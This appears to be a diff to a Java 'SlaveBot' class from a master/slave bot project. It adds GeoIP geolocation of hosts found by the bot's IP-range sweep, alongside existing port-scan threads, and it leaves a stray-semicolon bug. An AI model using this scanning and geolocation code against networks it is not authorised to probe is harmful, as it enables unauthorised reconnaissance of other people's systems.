@@ -1,7 +1,17 @@
 import java.net.*;
-import java.text.BreakIterator;
 import java.util.*;
 import java.io.*;
+
+import javax.tools.DocumentationTool.Location;
+
+import com.maxmind.geoip2.DatabaseReader;
+import com.maxmind.geoip2.exception.GeoIp2Exception;
+import com.maxmind.geoip2.model.CityResponse;
+import com.maxmind.geoip2.record.City;
+import com.maxmind.geoip2.record.Country;
+import com.maxmind.geoip2.record.Postal;
+import com.maxmind.geoip2.record.Subdivision;
+
 
 public class SlaveBot extends Thread
 {
@@ -13,6 +23,7 @@ public class SlaveBot extends Thread
 	Socket socketSelected;
 	Socket portScanSocket;
 	static String ipStringRange, portStringRange, target; 
+	static boolean isGeo = false;
 //--main---------------------------------------------------------------------------------------------------------------------------------------
 	public static void main(String[] args) 
 	{
@@ -166,10 +177,11 @@ public class SlaveBot extends Thread
 		}
 	}
 //--ipScan-------------------------------------------------------------------------------------------------------------------------------------
-	public void ipScan(Socket selectedSocket, String ipRangeString) throws IOException
+	public void ipScan(Socket selectedSocket, String ipRangeString, boolean loc) throws IOException
 	{
 		socketSelected = selectedSocket;
 		ipStringRange = ipRangeString;
+		isGeo = loc;
 		Runnable r1 = new Runnable1();	 
 		Thread t1 = new Thread(r1);
 		t1.start();
@@ -240,11 +252,12 @@ public class SlaveBot extends Thread
 				String[] tupleStart = range[0].split("\\.");
 				String[] tupleEnd = range[1].split("\\.");
 		
+				// only for slave 
 				if(tupleStart[0].equals("127") && tupleStart[1].equals("0") && tupleStart[2].equals("0"))
 				{
 					if(scan("127.0.0.1"));
 						listOfResponsdedTarget.add("127.0.0.1");
-					m.printIpScan(listOfResponsdedTarget);
+					m.printIpScan(listOfResponsdedTarget, isGeo);
 				}
 				else
 				{
@@ -282,21 +295,40 @@ public class SlaveBot extends Thread
 						ipString = sb.toString();
 						InetAddress ip = InetAddress.getByName(ipString);
 	
-						if(ip.isReachable(200))
+						if(ip.isReachable(200) && isGeo)
+						{
+							listOfResponsdedTarget.add(ipString);
+							File database = new File("src/GeoLite2-City.mmdb");
+							DatabaseReader reader = new DatabaseReader.Builder(database).build();
+							CityResponse response = reader.city(ip);
+							Country country = response.getCountry();
+							Subdivision subdivision = response.getMostSpecificSubdivision();
+							City city = response.getCity();
+							Postal postal = response.getPostal();
+							
+							System.out.println(ipString + ", Country: " + country.getName() 
+							+ ", State: " + subdivision.getName() + ", City: " + city.getName() 
+							+ ", Postal Code: " + postal.getCode() + ".");
+						}
+						
+						else if(ip.isReachable(200))
 						{
 							listOfResponsdedTarget.add(ipString);
 						}
 					}		
-					m.printIpScan(listOfResponsdedTarget);
+					m.printIpScan(listOfResponsdedTarget, isGeo);
 				}
 			} catch(IOException e)
 			{
 				System.out.println("ipScan Failure.");
 				e.printStackTrace();
+			} catch (GeoIp2Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
 			}
 		}
 	}
-//--Runnable1 class method for ipscan thread-----------------------------------------------------------------------------------------------------
+//--Runnable1 class method for tcpportscan thread-----------------------------------------------------------------------------------------------------
 	class Runnable2 implements Runnable
 	{
 //------run() method for threads-----------------------------------------------------------------------------------------------------------------
